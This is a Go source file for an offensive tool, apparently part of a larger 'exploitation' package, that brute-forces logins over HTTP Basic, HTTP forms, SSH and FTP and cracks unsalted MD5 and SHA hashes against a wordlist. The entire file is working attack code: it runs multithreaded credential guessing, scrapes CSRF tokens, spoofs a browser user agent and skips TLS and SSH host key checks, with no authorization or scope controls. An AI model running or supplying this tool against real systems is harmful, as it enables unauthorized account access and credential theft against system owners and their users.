package exploitation

import (
	"bufio"
	"crypto/md5"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/sha512"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"
)

// PasswordBrute performs real password brute forcing
type PasswordBrute struct {
	Target      string
	Users       []string
	Passwords   []string
	Protocol    string // http-basic, http-form, ssh, ftp
	FormData    FormConfig
	Threads     int
	Timeout     time.Duration
	UserAgent   string
	FoundCreds  []Credential
	Attempts    int64
	StopOnFirst bool
	mu          sync.Mutex
	stop        bool
}

// FormConfig for form-based authentication
type FormConfig struct {
	LoginURL       string
	UsernameField  string
	PasswordField  string
	ExtraFields    map[string]string
	SuccessPattern string
	FailurePattern string
	Method         string
	CSRFField      string
}

// Credential represents found credentials
type Credential struct {
	Username  string
	Password  string
	URL       string
	Protocol  string
	Timestamp time.Time
}

// NewPasswordBrute creates new password brute forcer
func NewPasswordBrute(target, protocol string, threads int) *PasswordBrute {
	return &PasswordBrute{
		Target:      target,
		Protocol:    protocol,
		Threads:     threads,
		Timeout:     10 * time.Second,
		UserAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		FoundCreds:  make([]Credential, 0),
		StopOnFirst: true,
	}
}

// SetUsers loads users from file or list
func (pb *PasswordBrute) SetUsers(usersInput string) error {
	if _, err := os.Stat(usersInput); err == nil {
		// It's a file
		file, err := os.Open(usersInput)
		if err != nil {
			return err
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			user := strings.TrimSpace(scanner.Text())
			if user != "" && !strings.HasPrefix(user, "#") {
				pb.Users = append(pb.Users, user)
			}
		}
	} else {
		// Comma-separated list
		for _, user := range strings.Split(usersInput, ",") {
			user = strings.TrimSpace(user)
			if user != "" {
				pb.Users = append(pb.Users, user)
			}
		}
	}
	return nil
}

// SetPasswords loads passwords from file or list
func (pb *PasswordBrute) SetPasswords(passwordsInput string) error {
	if _, err := os.Stat(passwordsInput); err == nil {
		file, err := os.Open(passwordsInput)
		if err != nil {
			return err
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			pass := strings.TrimSpace(scanner.Text())
			if pass != "" && !strings.HasPrefix(pass, "#") {
				pb.Passwords = append(pb.Passwords, pass)
			}
		}
	} else {
		for _, pass := range strings.Split(passwordsInput, ",") {
			pass = strings.TrimSpace(pass)
			if pass != "" {
				pb.Passwords = append(pb.Passwords, pass)
			}
		}
	}
	return nil
}

// Brute performs the brute force attack
func (pb *PasswordBrute) Brute() error {
	color.Cyan("\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
	color.Cyan("â•‘            PASSWORD BRUTE FORCE - REAL MODE                  â•‘")
	color.Cyan("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
	color.Cyan("\nğŸ¯ Target: %s", pb.Target)
	color.Cyan("ğŸ”§ Protocol: %s", pb.Protocol)
	color.Cyan("ğŸ‘¤ Users: %d", len(pb.Users))
	color.Cyan("ğŸ”‘ Passwords: %d", len(pb.Passwords))
	color.Cyan("âš¡ Threads: %d", pb.Threads)
	color.Cyan("ğŸ“Š Total attempts: %d\n", len(pb.Users)*len(pb.Passwords))

	startTime := time.Now()

	switch pb.Protocol {
	case "http-basic":
		pb.bruteHTTPBasic()
	case "http-form":
		pb.bruteHTTPForm()
	case "ssh":
		pb.bruteSSH()
	case "ftp":
		pb.bruteFTP()
	default:
		return fmt.Errorf("unsupported protocol: %s", pb.Protocol)
	}

	elapsed := time.Since(startTime)
	pb.printResults()
	color.Cyan("\nâ±ï¸  Completed in %v", elapsed.Round(time.Second))
	color.Cyan("ğŸ“Š Attempts: %d | Rate: %.0f/sec\n", pb.Attempts, float64(pb.Attempts)/elapsed.Seconds())

	return nil
}

// bruteHTTPBasic performs HTTP Basic Auth brute force
func (pb *PasswordBrute) bruteHTTPBasic() {
	color.Yellow("\n[*] Starting HTTP Basic Auth brute force...\n")

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:    pb.Threads * 2,
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   pb.Timeout,
	}

	credChan := make(chan [2]string, pb.Threads*2)
	var wg sync.WaitGroup

	// Start workers
	for i := 0; i < pb.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for cred := range credChan {
				if pb.stop {
					return
				}
				pb.tryHTTPBasic(client, cred[0], cred[1])
			}
		}()
	}

	// Send credentials
	for _, user := range pb.Users {
		for _, pass := range pb.Passwords {
			if pb.stop {
				break
			}
			credChan <- [2]string{user, pass}
		}
		if pb.stop {
			break
		}
	}

	close(credChan)
	wg.Wait()
}

func (pb *PasswordBrute) tryHTTPBasic(client *http.Client, username, password string) {
	pb.mu.Lock()
	pb.Attempts++
	attempts := pb.Attempts
	pb.mu.Unlock()

	if attempts%100 == 0 {
		color.Yellow("  [*] Progress: %d attempts...", attempts)
	}

	req, err := http.NewRequest("GET", pb.Target, nil)
	if err != nil {
		return
	}

	req.SetBasicAuth(username, password)
	req.Header.Set("User-Agent", pb.UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 || resp.StatusCode == 301 || resp.StatusCode == 302 {
		cred := Credential{
			Username:  username,
			Password:  password,
			URL:       pb.Target,
			Protocol:  "http-basic",
			Timestamp: time.Now(),
		}

		pb.mu.Lock()
		pb.FoundCreds = append(pb.FoundCreds, cred)
		if pb.StopOnFirst {
			pb.stop = true
		}
		pb.mu.Unlock()

		color.Green("\n  âœ… FOUND: %s:%s", username, password)
	}
}

// bruteHTTPForm performs HTTP form-based brute force
func (pb *PasswordBrute) bruteHTTPForm() {
	color.Yellow("\n[*] Starting HTTP Form brute force...\n")

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:    pb.Threads * 2,
	}

	cookieJar := &simpleCookieJar{cookies: make(map[string][]*http.Cookie)}

	client := &http.Client{
		Transport: transport,
		Timeout:   pb.Timeout,
		Jar:       cookieJar,
	}

	credChan := make(chan [2]string, pb.Threads*2)
	var wg sync.WaitGroup

	for i := 0; i < pb.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for cred := range credChan {
				if pb.stop {
					return
				}
				pb.tryHTTPForm(client, cred[0], cred[1])
			}
		}()
	}

	for _, user := range pb.Users {
		for _, pass := range pb.Passwords {
			if pb.stop {
				break
			}
			credChan <- [2]string{user, pass}
		}
		if pb.stop {
			break
		}
	}

	close(credChan)
	wg.Wait()
}

func (pb *PasswordBrute) tryHTTPForm(client *http.Client, username, password string) {
	pb.mu.Lock()
	pb.Attempts++
	attempts := pb.Attempts
	pb.mu.Unlock()

	if attempts%100 == 0 {
		color.Yellow("  [*] Progress: %d attempts...", attempts)
	}

	// Build form data
	formData := url.Values{}
	formData.Set(pb.FormData.UsernameField, username)
	formData.Set(pb.FormData.PasswordField, password)
	for k, v := range pb.FormData.ExtraFields {
		formData.Set(k, v)
	}

	// Get CSRF token if needed
	if pb.FormData.CSRFField != "" {
		csrfToken := pb.getCSRFToken(client)
		if csrfToken != "" {
			formData.Set(pb.FormData.CSRFField, csrfToken)
		}
	}

	method := pb.FormData.Method
	if method == "" {
		method = "POST"
	}

	var req *http.Request
	var err error

	if method == "POST" {
		req, err = http.NewRequest("POST", pb.FormData.LoginURL, strings.NewReader(formData.Encode()))
		if err != nil {
			return
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		req, err = http.NewRequest("GET", pb.FormData.LoginURL+"?"+formData.Encode(), nil)
		if err != nil {
			return
		}
	}

	req.Header.Set("User-Agent", pb.UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	// Check success/failure patterns
	success := false

	if pb.FormData.SuccessPattern != "" {
		if matched, _ := regexp.MatchString(pb.FormData.SuccessPattern, bodyStr); matched {
			success = true
		}
	}

	if pb.FormData.FailurePattern != "" {
		if matched, _ := regexp.MatchString(pb.FormData.FailurePattern, bodyStr); matched {
			success = false
		}
	}

	// Default: check for redirects or dashboard-like content
	if pb.FormData.SuccessPattern == "" && pb.FormData.FailurePattern == "" {
		if resp.StatusCode == 302 || resp.StatusCode == 301 {
			location := resp.Header.Get("Location")
			if !strings.Contains(strings.ToLower(location), "login") && !strings.Contains(strings.ToLower(location), "error") {
				success = true
			}
		}
		// Check for common failure patterns
		failurePatterns := []string{"invalid", "incorrect", "wrong", "failed", "error", "denied"}
		hasFailure := false
		for _, pattern := range failurePatterns {
			if strings.Contains(strings.ToLower(bodyStr), pattern) {
				hasFailure = true
				break
			}
		}
		if !hasFailure && (resp.StatusCode == 200 || resp.StatusCode == 302) {
			// Check for success indicators
			successPatterns := []string{"dashboard", "welcome", "logout", "account", "profile"}
			for _, pattern := range successPatterns {
				if strings.Contains(strings.ToLower(bodyStr), pattern) {
					success = true
					break
				}
			}
		}
	}

	if success {
		cred := Credential{
			Username:  username,
			Password:  password,
			URL:       pb.FormData.LoginURL,
			Protocol:  "http-form",
			Timestamp: time.Now(),
		}

		pb.mu.Lock()
		pb.FoundCreds = append(pb.FoundCreds, cred)
		if pb.StopOnFirst {
			pb.stop = true
		}
		pb.mu.Unlock()

		color.Green("\n  âœ… FOUND: %s:%s", username, password)
	}
}

func (pb *PasswordBrute) getCSRFToken(client *http.Client) string {
	resp, err := client.Get(pb.FormData.LoginURL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	// Common CSRF patterns
	patterns := []string{
		`name="csrf_token" value="([^"]+)"`,
		`name="_token" value="([^"]+)"`,
		`name="authenticity_token" value="([^"]+)"`,
		`name="csrfmiddlewaretoken" value="([^"]+)"`,
		`name="_csrf" value="([^"]+)"`,
		`<meta name="csrf-token" content="([^"]+)"`,
	}

	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		if matches := re.FindStringSubmatch(bodyStr); len(matches) > 1 {
			return matches[1]
		}
	}

	return ""
}

// bruteSSH performs SSH brute force
func (pb *PasswordBrute) bruteSSH() {
	color.Yellow("\n[*] Starting SSH brute force...\n")

	credChan := make(chan [2]string, pb.Threads*2)
	var wg sync.WaitGroup

	for i := 0; i < pb.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for cred := range credChan {
				if pb.stop {
					return
				}
				pb.trySSH(cred[0], cred[1])
			}
		}()
	}

	for _, user := range pb.Users {
		for _, pass := range pb.Passwords {
			if pb.stop {
				break
			}
			credChan <- [2]string{user, pass}
		}
		if pb.stop {
			break
		}
	}

	close(credChan)
	wg.Wait()
}

func (pb *PasswordBrute) trySSH(username, password string) {
	pb.mu.Lock()
	pb.Attempts++
	attempts := pb.Attempts
	pb.mu.Unlock()

	if attempts%50 == 0 {
		color.Yellow("  [*] Progress: %d attempts...", attempts)
	}

	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         pb.Timeout,
	}

	target := pb.Target
	if !strings.Contains(target, ":") {
		target = target + ":22"
	}

	conn, err := ssh.Dial("tcp", target, config)
	if err != nil {
		return
	}
	defer conn.Close()

	// Connection successful
	cred := Credential{
		Username:  username,
		Password:  password,
		URL:       target,
		Protocol:  "ssh",
		Timestamp: time.Now(),
	}

	pb.mu.Lock()
	pb.FoundCreds = append(pb.FoundCreds, cred)
	if pb.StopOnFirst {
		pb.stop = true
	}
	pb.mu.Unlock()

	color.Green("\n  âœ… FOUND SSH: %s:%s @ %s", username, password, target)
}

// bruteFTP performs FTP brute force
func (pb *PasswordBrute) bruteFTP() {
	color.Yellow("\n[*] Starting FTP brute force...\n")

	credChan := make(chan [2]string, pb.Threads*2)
	var wg sync.WaitGroup

	for i := 0; i < pb.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for cred := range credChan {
				if pb.stop {
					return
				}
				pb.tryFTP(cred[0], cred[1])
			}
		}()
	}

	for _, user := range pb.Users {
		for _, pass := range pb.Passwords {
			if pb.stop {
				break
			}
			credChan <- [2]string{user, pass}
		}
		if pb.stop {
			break
		}
	}

	close(credChan)
	wg.Wait()
}

func (pb *PasswordBrute) tryFTP(username, password string) {
	pb.mu.Lock()
	pb.Attempts++
	attempts := pb.Attempts
	pb.mu.Unlock()

	if attempts%50 == 0 {
		color.Yellow("  [*] Progress: %d attempts...", attempts)
	}

	target := pb.Target
	if !strings.Contains(target, ":") {
		target = target + ":21"
	}

	conn, err := net.DialTimeout("tcp", target, pb.Timeout)
	if err != nil {
		return
	}
	defer conn.Close()

	reader := bufio.NewReader(conn)

	// Read banner
	_, _ = reader.ReadString('\n')

	// Send username
	fmt.Fprintf(conn, "USER %s\r\n", username)
	response, _ := reader.ReadString('\n')

	if !strings.HasPrefix(response, "331") {
		return
	}

	// Send password
	fmt.Fprintf(conn, "PASS %s\r\n", password)
	response, _ = reader.ReadString('\n')

	if strings.HasPrefix(response, "230") {
		cred := Credential{
			Username:  username,
			Password:  password,
			URL:       target,
			Protocol:  "ftp",
			Timestamp: time.Now(),
		}

		pb.mu.Lock()
		pb.FoundCreds = append(pb.FoundCreds, cred)
		if pb.StopOnFirst {
			pb.stop = true
		}
		pb.mu.Unlock()

		color.Green("\n  âœ… FOUND FTP: %s:%s @ %s", username, password, target)
	}

	fmt.Fprintf(conn, "QUIT\r\n")
}

func (pb *PasswordBrute) printResults() {
	color.Cyan("\n\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
	color.Cyan("â•‘                   BRUTE FORCE RESULTS                         â•‘")
	color.Cyan("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n")

	if len(pb.FoundCreds) == 0 {
		color.Yellow("âŒ No credentials found\n")
		return
	}

	color.Green("âœ… Found %d valid credentials:\n", len(pb.FoundCreds))
	for i, cred := range pb.FoundCreds {
		fmt.Printf("%d. [%s] %s:%s @ %s\n", i+1, strings.ToUpper(cred.Protocol), cred.Username, cred.Password, cred.URL)
	}
}

// HashCracker performs hash cracking
type HashCracker struct {
	Hashes   []HashEntry
	Wordlist string
	HashType string
	Threads  int
	Cracked  []CrackedHash
	Attempts int64
	mu       sync.Mutex
}

// HashEntry represents a hash to crack
type HashEntry struct {
	Hash     string
	Salt     string
	Original string
}

// CrackedHash represents a cracked hash
type CrackedHash struct {
	Hash      string
	Plaintext string
	HashType  string
	Timestamp time.Time
}

// NewHashCracker creates new hash cracker
func NewHashCracker(hashType string, threads int) *HashCracker {
	return &HashCracker{
		HashType: strings.ToLower(hashType),
		Threads:  threads,
		Hashes:   make([]HashEntry, 0),
		Cracked:  make([]CrackedHash, 0),
	}
}

// AddHash adds a hash to crack
func (hc *HashCracker) AddHash(hash string) {
	hc.Hashes = append(hc.Hashes, HashEntry{Hash: strings.ToLower(hash)})
}

// AddHashesFromFile loads hashes from file
func (hc *HashCracker) AddHashesFromFile(filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		hash := strings.TrimSpace(scanner.Text())
		if hash != "" && !strings.HasPrefix(hash, "#") {
			hc.AddHash(hash)
		}
	}
	return nil
}

// Crack performs hash cracking
func (hc *HashCracker) Crack() error {
	color.Cyan("\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
	color.Cyan("â•‘               HASH CRACKER - REAL MODE                        â•‘")
	color.Cyan("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
	color.Cyan("\nğŸ” Hash Type: %s", strings.ToUpper(hc.HashType))
	color.Cyan("ğŸ”¢ Hashes to crack: %d", len(hc.Hashes))
	color.Cyan("ğŸ“ Wordlist: %s", hc.Wordlist)
	color.Cyan("âš¡ Threads: %d\n", hc.Threads)

	if len(hc.Hashes) == 0 {
		return fmt.Errorf("no hashes to crack")
	}

	file, err := os.Open(hc.Wordlist)
	if err != nil {
		return fmt.Errorf("failed to open wordlist: %v", err)
	}
	defer file.Close()

	startTime := time.Now()

	// Build hash lookup map for faster checking
	hashMap := make(map[string]bool)
	for _, h := range hc.Hashes {
		hashMap[h.Hash] = true
	}

	wordChan := make(chan string, hc.Threads*100)
	doneChan := make(chan bool)
	var wg sync.WaitGroup

	// Start workers
	for i := 0; i < hc.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for word := range wordChan {
				hc.tryWord(word, hashMap)
			}
		}()
	}

	// Progress reporter
	go hc.reportProgress(doneChan)

	// Read wordlist
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		word := scanner.Text()
		if word != "" {
			wordChan <- word
		}
	}

	close(wordChan)
	wg.Wait()
	doneChan <- true

	elapsed := time.Since(startTime)
	hc.printResults()
	color.Cyan("\nâ±ï¸  Completed in %v", elapsed.Round(time.Second))
	color.Cyan("ğŸ“Š Attempts: %d | Rate: %.0f/sec\n", hc.Attempts, float64(hc.Attempts)/elapsed.Seconds())

	return nil
}

func (hc *HashCracker) tryWord(word string, hashMap map[string]bool) {
	hc.mu.Lock()
	hc.Attempts++
	hc.mu.Unlock()

	var computedHash string

	switch hc.HashType {
	case "md5":
		hash := md5.Sum([]byte(word))
		computedHash = hex.EncodeToString(hash[:])
	case "sha1":
		hash := sha1.Sum([]byte(word))
		computedHash = hex.EncodeToString(hash[:])
	case "sha256":
		hash := sha256.Sum256([]byte(word))
		computedHash = hex.EncodeToString(hash[:])
	case "sha512":
		hash := sha512.Sum512([]byte(word))
		computedHash = hex.EncodeToString(hash[:])
	default:
		return
	}

	if hashMap[computedHash] {
		cracked := CrackedHash{
			Hash:      computedHash,
			Plaintext: word,
			HashType:  hc.HashType,
			Timestamp: time.Now(),
		}

		hc.mu.Lock()
		hc.Cracked = append(hc.Cracked, cracked)
		delete(hashMap, computedHash)
		hc.mu.Unlock()

		color.Green("\n  âœ… CRACKED: %s -> %s", computedHash[:32]+"...", word)
	}
}

func (hc *HashCracker) reportProgress(done chan bool) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	start := time.Now()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			hc.mu.Lock()
			attempts := hc.Attempts
			cracked := len(hc.Cracked)
			remaining := len(hc.Hashes) - cracked
			hc.mu.Unlock()

			elapsed := time.Since(start).Seconds()
			rate := float64(attempts) / elapsed
			color.Yellow("  âš¡ Progress: %d attempts | %.0f H/sec | %d cracked | %d remaining",
				attempts, rate, cracked, remaining)
		}
	}
}

func (hc *HashCracker) printResults() {
	color.Cyan("\n\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
	color.Cyan("â•‘                   HASH CRACKING RESULTS                       â•‘")
	color.Cyan("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n")

	if len(hc.Cracked) == 0 {
		color.Yellow("âŒ No hashes cracked\n")
		return
	}

	color.Green("âœ… Cracked %d/%d hashes:\n", len(hc.Cracked), len(hc.Hashes))
	for i, c := range hc.Cracked {
		fmt.Printf("%d. %s : %s\n", i+1, c.Hash, c.Plaintext)
	}
}

// Simple cookie jar implementation
type simpleCookieJar struct {
	cookies map[string][]*http.Cookie
	mu      sync.Mutex
}

func (j *simpleCookieJar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	j.mu.Lock()
	defer j.mu.Unlock()
	j.cookies[u.Host] = append(j.cookies[u.Host], cookies...)
}

func (j *simpleCookieJar) Cookies(u *url.URL) []*http.Cookie {
	j.mu.Lock()
	defer j.mu.Unlock()
	return j.cookies[u.Host]
}
